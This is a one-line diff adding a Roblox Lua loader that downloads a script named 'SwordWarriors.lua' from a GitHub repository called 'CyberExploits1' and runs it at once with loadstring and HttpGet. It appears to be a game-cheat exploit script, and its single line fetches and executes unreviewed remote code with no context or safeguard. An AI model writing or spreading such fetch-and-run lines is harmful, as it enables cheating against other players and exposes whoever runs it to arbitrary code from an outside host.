@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CyberExploits1/Scripts/main/SwordWarriors.lua",true))()
